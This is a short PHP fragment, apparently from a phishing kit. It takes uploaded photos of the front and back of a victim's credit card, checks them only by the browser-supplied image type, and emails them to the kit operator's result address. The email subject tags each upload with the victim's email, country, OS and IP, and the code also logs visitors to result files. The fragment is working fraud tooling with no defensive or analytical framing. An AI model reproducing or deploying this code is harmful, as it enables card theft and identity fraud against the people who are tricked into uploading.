...
$file_extension = end($temporary);
    if ((($_FILES["file"]["type"] == "image/png") || ($_FILES["file"]["type"] == "image/jpg") || ($_FILES["file"]["type"] == "image/jpeg"))){
        ...
        $from = $_SESSION['from'];
        $subject = "💟 FRONT CC: ".$_SESSION['email']." [ $cn - $os - $ip ]";
        kirim_foto($config['email_result'], $from, $subject, $targetPath);
        tulis_file("../result/total_photocc.txt", $ip);
        tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Mengupload Foto CC");
        }
}
else
{
...
$file_extension = end($temporary);
    if ((($_FILES["file2"]["type"] == "image/png") || ($_FILES["file2"]["type"] == "image/jpg") || ($_FILES["file2"]["type"] == "image/jpeg"))){
        ...
        move_uploaded_file($sourcePath,$targetPath) ;
        $from = $_SESSION['from'];
        $subject = "💟 BACK CC: ".$_SESSION['email']." [ $cn - $os - $ip ]";
        kirim_foto($config['email_result'], $from, $subject, $targetPath);
        }
}
else
